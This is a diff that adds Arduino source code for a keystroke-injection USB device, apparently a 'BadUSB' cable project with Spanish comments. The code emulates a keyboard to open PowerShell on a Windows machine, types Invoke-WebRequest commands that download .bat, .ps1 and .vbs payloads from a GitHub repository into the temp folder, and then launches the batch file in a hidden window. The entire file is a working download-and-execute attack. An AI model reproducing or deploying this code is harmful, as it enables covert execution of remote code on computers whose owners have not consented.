@@ -1,0 +1,49 @@
+#include "exfil.h"
+#include "phukd.h"
+
+const char *nombre_inicial = "payload_inicial"; //NO TOCAR
+const char *nombre_payloadVBS = "payload_inicial_vbs"; //NO TOCAR
+const char *nombre_payloadPS1 = "payload_troll";
+
+void descarga(){
+  delay(300);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.write('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(250);
+  Keyboard.println("powershell");
+  delay(1800); // más tiempo para que PS abra
+
+ // Montamos la URL usando la constante
+  String comandoDescargaInicial = "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/";
+  comandoDescargaInicial += nombre_inicial;      
+  comandoDescargaInicial += ".bat\" -OutFile \"$env:TEMP\\payload_inicial.bat\"";
+
+  // Montamos la URL usando la constante
+  String comandoDescargaPS1 = "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/";
+  comandoDescargaPS1 += nombre_payloadPS1;      
+  comandoDescargaPS1 += ".ps1\" -OutFile \"$env:TEMP\\payload_ps1.ps1\"";
+
+  String comandoDescargaVBS = "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/";
+  comandoDescargaVBS += nombre_payloadVBS;      
+  comandoDescargaVBS += ".vbs\" -OutFile \"$env:TEMP\\payload_vbs.vbs\"";
+
+  Keyboard.println(comandoDescargaInicial); 
+  delay(600); 
+
+  Keyboard.println(comandoDescargaPS1); 
+  delay(600); 
+
+  Keyboard.println(comandoDescargaVBS);  
+  delay(600); 
+
+  Keyboard.println("powershell -WindowStyle Hidden -Command \"Start-Process \'$env:TEMP\\payload_inicial.bat\'\"; exit");
+
+}
+
+void payload() {
+  delay(1000);
+
+  descarga();
+} 
